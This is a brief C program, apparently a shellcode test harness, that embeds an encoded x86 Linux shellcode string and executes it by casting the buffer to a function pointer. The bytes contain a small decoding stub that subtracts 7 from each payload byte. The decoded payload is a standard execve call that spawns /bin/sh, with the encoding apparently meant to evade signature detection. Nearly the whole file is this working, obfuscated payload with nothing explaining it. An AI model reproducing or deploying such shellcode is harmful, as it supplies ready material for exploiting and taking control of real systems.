#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x2e\x07\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x38\xc7\x57\x6f\x36\x36\x7a\x6f\x6f\x36\x69\x70\x75\x90\xea\x57\x90\xe9\x5a\x90\xe8\xb7\x12\xd4\x87";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
